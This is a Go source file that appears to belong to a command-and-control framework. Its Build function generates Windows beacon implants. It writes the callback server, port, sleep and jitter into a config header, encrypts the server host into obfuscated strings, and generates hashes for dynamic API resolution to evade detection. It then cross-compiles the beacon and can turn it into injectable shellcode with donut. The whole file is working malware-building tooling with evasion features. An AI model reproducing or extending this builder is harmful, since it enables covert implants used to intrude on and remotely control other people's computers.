package builder

import (
	"bytes"
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"time"

	"c2/hashgen"
	"c2/obfgen"

	"github.com/Binject/go-donut/donut"
)

var hostRE = regexp.MustCompile(`^[a-zA-Z0-9.\-]{1,253}$`)

// BuildParams holds all parameters for a beacon build.
type BuildParams struct {
	ServerHost       string // IP or hostname embedded in config.h
	ServerPort       int    // TCP port (1–65535)
	SleepMS          int    // beacon sleep interval in milliseconds (1000–259200000)
	JitterPct        int    // jitter percentage (0–100)
	BeaconSrc        string // absolute path to the beacon/ source directory
	UseHTTPS         bool   // beacon uses HTTPS (WINHTTP_FLAG_SECURE)
	IgnoreCertErrors bool   // beacon ignores TLS cert errors (self-signed cert)
	Format           string // output format: "exe" (default) or "bin" (shellcode via donut)
	SessionPort      int    // TCP port for session mode (0 = disabled)
}

func validate(p BuildParams) error {
	if !hostRE.MatchString(p.ServerHost) {
		return fmt.Errorf("invalid server_host %q: must match [a-zA-Z0-9.\\-]{1,253}", p.ServerHost)
	}
	if p.ServerPort < 1 || p.ServerPort > 65535 {
		return fmt.Errorf("server_port must be 1–65535, got %d", p.ServerPort)
	}
	if p.SleepMS < 1000 || p.SleepMS > 259200000 {
		return fmt.Errorf("sleep_ms must be 1000–259200000, got %d", p.SleepMS)
	}
	if p.JitterPct < 0 || p.JitterPct > 100 {
		return fmt.Errorf("jitter_pct must be 0–100, got %d", p.JitterPct)
	}
	return nil
}

func configH(p BuildParams) string {
	base := fmt.Sprintf(`#pragma once

#define SERVER_PORT  %d
#define SLEEP_MS     %d
#define JITTER_PCT   %d
`, p.ServerPort, p.SleepMS, p.JitterPct)

	if p.UseHTTPS {
		base += "#define USE_HTTPS\n"
	}
	if p.IgnoreCertErrors {
		base += "#define IGNORE_CERT_ERRORS\n"
	}
	if p.SessionPort > 0 {
		base += fmt.Sprintf("#define SESSION_PORT  %d\n", p.SessionPort)
	}
	return base
}

// Build validates params, copies beacon source to a temp directory,
// injects a custom config.h, runs cmake, and returns the beacon.exe bytes.
// The temp directory is removed on return regardless of outcome.
func Build(p BuildParams) ([]byte, error) {
	if err := validate(p); err != nil {
		return nil, err
	}

	tmpDir, err := os.MkdirTemp("", "byps-build-*")
	if err != nil {
		return nil, fmt.Errorf("mkdirtemp: %w", err)
	}
	defer os.RemoveAll(tmpDir)

	srcDir := filepath.Join(tmpDir, "beacon")
	buildDir := filepath.Join(tmpDir, "build")

	// Copy entire beacon source tree into tmpDir/beacon
	cp := exec.Command("cp", "-r", p.BeaconSrc, srcDir)
	if out, err := cp.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("copy beacon source: %w\n%s", err, out)
	}

	// Overwrite include/config.h with build-specific values
	configPath := filepath.Join(srcDir, "include", "config.h")
	if err := os.WriteFile(configPath, []byte(configH(p)), 0644); err != nil {
		return nil, fmt.Errorf("write config.h: %w", err)
	}

	// Generate obf_strings.h with the correct server host encrypted
	includeDir := filepath.Join(srcDir, "include")
	if err := obfgen.Generate(p.ServerHost, includeDir); err != nil {
		return nil, fmt.Errorf("generate obf_strings.h: %w", err)
	}

	// Generate api_hashes.h — DJB2 constants for dynamic API resolution
	if err := hashgen.Generate(includeDir); err != nil {
		return nil, fmt.Errorf("generate api_hashes.h: %w", err)
	}

	toolchain := filepath.Join(srcDir, "mingw64.cmake")
	ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
	defer cancel()

	// cmake configure
	configure := exec.CommandContext(ctx, "cmake",
		"-S", srcDir, "-B", buildDir,
		"-DCMAKE_TOOLCHAIN_FILE="+toolchain)
	if out, err := configure.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("cmake configure: %w\n%s", err, out)
	}

	// cmake build
	build := exec.CommandContext(ctx, "cmake", "--build", buildDir)
	if out, err := build.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("cmake build: %w\n%s", err, out)
	}

	data, err := os.ReadFile(filepath.Join(buildDir, "beacon.exe"))
	if err != nil {
		return nil, fmt.Errorf("read beacon.exe: %w", err)
	}

	if p.Format == "bin" {
		cfg := donut.DefaultConfig()
		cfg.Arch = donut.X64
		sc, err := donut.ShellcodeFromBytes(bytes.NewBuffer(data), cfg)
		if err != nil {
			return nil, fmt.Errorf("donut shellcode: %w", err)
		}
		data = sc.Bytes()
	}

	return data, nil
}
